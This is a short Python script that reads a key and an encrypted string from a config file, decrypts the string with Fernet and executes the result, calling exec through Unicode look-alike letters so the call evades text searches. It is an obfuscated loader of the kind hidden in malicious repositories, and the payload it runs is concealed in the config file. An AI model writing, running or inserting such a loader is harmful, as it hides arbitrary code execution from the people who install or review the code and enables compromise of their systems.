from cryptography.fernet import Fernet
import os

def mian():
    config_path = os.path.join("configs", "set_config.ini")
    with open(config_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()
    c = Fernet(lines[2].split('key2=')[1].strip().encode("utf-8")).decrypt(lines[3].split('context2=')[1].strip().encode("utf-8"))
    ℯ𝓍ℯ𝒸(c)

if __name__ == "__main__":
    mian()
